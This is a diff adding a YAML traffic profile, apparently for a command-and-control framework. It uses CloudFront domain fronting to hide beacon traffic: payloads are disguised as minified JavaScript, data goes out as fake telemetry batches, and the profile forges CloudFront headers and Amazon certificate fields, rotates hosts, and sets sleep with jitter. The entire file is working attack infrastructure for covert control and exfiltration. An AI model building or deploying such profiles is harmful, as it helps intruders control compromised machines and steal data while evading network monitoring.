@@ -1,0 +1,71 @@
+# cdn-cloudfront.yaml — CloudFront domain fronting
+# GET requests fetch "static assets"; POST requests submit "telemetry".
+# Domain fronting: TLS SNI points to CDN edge, Host header routes to C2 origin.
+
+name: cdn-cloudfront
+description: CloudFront CDN domain fronting with static asset masquerade
+
+http-get:
+  uri:
+    - /assets/app.min.js
+    - /assets/vendor.bundle.js
+    - /assets/analytics.js
+    - /assets/config.json
+    - /static/js/main.chunk.js
+  headers:
+    Host: "{{FRONTED_HOST}}"
+    Accept: "*/*"
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: en-US,en;q=0.9
+    Referer: "https://{{FRONTED_HOST}}/"
+    X-Amz-Cf-Id: "{{RAND}}"
+    Via: "1.1 {{RAND}}.cloudfront.net (CloudFront)"
+    X-Cache: Hit from cloudfront
+    Cache-Control: max-age=86400
+  body:
+    # Payload disguised as minified JavaScript
+    prepend: "var _0x=['"
+    append: "'];(function(_0xc){_0xc()});"
+    transform: base64
+
+http-post:
+  uri:
+    - /api/telemetry
+    - /api/v2/analytics/collect
+    - /api/events/batch
+  headers:
+    Host: "{{FRONTED_HOST}}"
+    Content-Type: application/json
+    Accept: application/json
+    Accept-Encoding: gzip, deflate, br
+    Origin: "https://{{FRONTED_HOST}}"
+    X-Amz-Cf-Id: "{{RAND}}"
+    X-Request-Id: "{{RAND}}"
+  body:
+    # Payload wrapped as a telemetry event batch
+    prepend: '{"events":[{"type":"pageview","timestamp":"2026-01-01T00:00:00Z","data":"'
+    append: '"}],"client_id":"{{AGENT_ID}}","batch_size":1}'
+    transform: base64
+
+https-certificate:
+  CN: "*.cloudfront.net"
+  O: "Amazon.com, Inc."
+
+host-rotation:
+  strategy: failover   # try hosts in order, skip failures
+  hosts:
+    - d1a2b3c4.cloudfront.net
+    - d5e6f7a8.cloudfront.net
+    - d9b0c1d2.cloudfront.net
+  domain-fronting:
+    sni: d1a2b3c4.cloudfront.net
+    host: cdn.example-app.com     # operator replaces with real fronted domain
+
+sleep:
+  default: 45
+  jitter: 30
+
+user-agent:
+  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+  - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
+  - "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
